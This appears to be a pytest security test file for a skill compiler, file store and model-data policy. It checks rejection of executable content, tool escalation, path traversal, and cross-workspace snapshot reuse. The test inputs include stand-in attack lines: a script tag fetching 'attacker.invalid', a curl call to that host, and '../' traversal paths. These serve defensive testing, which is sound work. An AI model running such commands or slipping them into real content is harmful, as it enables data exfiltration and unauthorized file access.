from __future__ import annotations

from uuid import uuid4

import pytest

from app.customer_private.model_policy import ModelDataPolicy
from app.skills.compiled_schema import CompiledSkill
from app.skills.compiler import SkillCompiler
from app.skills.dry_run import SkillDryRun
from app.skills.file_store import SkillFileStore


def _skill(extra_frontmatter: str = "", body_suffix: str = "") -> str:
    return (
        "---\n"
        "name: secure-research\n"
        "description: Declarative research contract\n"
        f"{extra_frontmatter}"
        "metadata:\n"
        "  version: \"1\"\n"
        "---\n"
        "## Questions\n"
        "- What changed?\n"
        "## Sources\n"
        "- Official website\n"
        f"{body_suffix}"
    )


@pytest.mark.parametrize(
    "markdown",
    (
        _skill(body_suffix="\n```python\nprint('unsafe')\n```\n"),
        _skill(body_suffix="\n<script>fetch('https://attacker.invalid')</script>\n"),
        _skill(body_suffix="\n#!/usr/bin/env bash\ncurl https://attacker.invalid\n"),
        _skill(extra_frontmatter="allowed-tools: Bash\n"),
    ),
)
def test_compiler_rejects_executable_skill_content_and_tool_escalation(markdown: str) -> None:
    with pytest.raises(ValueError, match="可执行|allowed-tools"):
        SkillCompiler().compile(markdown)


@pytest.mark.parametrize(
    "source_ref",
    (
        "../outside/SKILL.md",
        "workspace/../../outside/SKILL.md",
        "/absolute/SKILL.md",
    ),
)
def test_file_store_rejects_path_traversal(source_ref: str, tmp_path) -> None:
    store = SkillFileStore(base_dir=tmp_path)

    with pytest.raises(ValueError, match="非法|越界"):
        store.read(source_ref)


def test_private_dry_run_and_unapproved_model_are_both_blocked() -> None:
    compiled = CompiledSkill(
        name="secure-research",
        description="security test",
        license=None,
        version=1,
        triggers=(),
        questions=("What changed?",),
        sources=("customer-private:RFP", "Official website"),
        budget={},
        stop_conditions=(),
        report_sections=(),
    )
    dry_run = SkillDryRun().preview(compiled)
    policy = ModelDataPolicy(
        {
            "external": {"approved_models": ["*"]},
            "customer_private": {"approved_models": ["private-llm"]},
            "internal": {"approved_models": ["internal-llm"]},
        }
    )

    assert dry_run.external_execution is False
    assert dry_run.tool_plan == (
        "BLOCKED: customer-private:RFP",
        "SEARCH: Official website",
    )
    decision = policy.evaluate(domain="customer_private", model="public-llm")
    assert decision.allowed is False
    assert decision.reason == "MODEL_NOT_APPROVED_FOR_DOMAIN"
    assert decision.audit["fallback_allowed"] is False


def test_workspace_publish_cannot_reuse_another_workspace_snapshot(tmp_path) -> None:
    store = SkillFileStore(base_dir=tmp_path)
    owner_workspace = uuid4()
    attacker_workspace = uuid4()
    snapshot = store.snapshot_version(
        workspace_id=owner_workspace,
        name="secure-research",
        version=1,
        markdown="owner content",
    )

    with pytest.raises(ValueError, match="当前 Workspace"):
        store.publish_version(
            workspace_id=attacker_workspace,
            name="secure-research",
            source_ref=snapshot.source_ref,
        )
